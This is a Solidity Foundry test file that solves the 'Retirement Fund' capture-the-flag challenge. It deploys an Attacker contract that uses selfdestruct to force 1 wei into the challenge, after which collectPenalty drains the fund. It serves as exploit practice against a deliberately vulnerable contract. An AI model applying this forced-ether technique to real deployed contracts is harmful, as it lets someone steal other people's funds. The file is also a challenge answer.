// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {RetirementFundChallenge} from "src/Math/RetirementFund.sol";

contract RetirementFundChallengeTest is Test {
    RetirementFundChallenge public retirementFundChallenge;
    address hacker = makeAddr("hacker");

    function setUp() public {
        payable(hacker).transfer(1 ether);

        retirementFundChallenge = new RetirementFundChallenge{value: 1 ether}(hacker);
    }

    // without fallback/receive function, it reverts;
    function testRetirementFund1() public {
        console.log("my balance:", hacker.balance);
        console.log(
            "challenge balance:",
            address(retirementFundChallenge).balance
        );

        vm.startPrank(hacker);
        vm.expectRevert();
        payable(address(retirementFundChallenge)).transfer(1 wei);

        console.log(
            "after transfer, challenge balance:",
            address(retirementFundChallenge).balance
        );

        vm.expectRevert();
        retirementFundChallenge.collectPenalty();
        vm.stopPrank();

        console.log("my new balance:", hacker.balance);
        console.log(
            "challenge new balance:",
            address(retirementFundChallenge).balance
        );

        assertFalse(retirementFundChallenge.isComplete());
    }

    function testRetirementFund2() public {
        console.log("my balance:", hacker.balance);
        console.log(
            "challenge balance:",
            address(retirementFundChallenge).balance
        );

        vm.startPrank(hacker);
        new Attacker{value: 1 wei}(payable(address(retirementFundChallenge)));

        console.log(
            "after selfdestruct, challenge balance:",
            address(retirementFundChallenge).balance
        );

        retirementFundChallenge.collectPenalty();
        vm.stopPrank();

        console.log("my new balance:", hacker.balance);
        console.log(
            "challenge new balance:",
            address(retirementFundChallenge).balance
        );

        assertTrue(retirementFundChallenge.isComplete());
    }
}

contract Attacker {
    constructor(address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}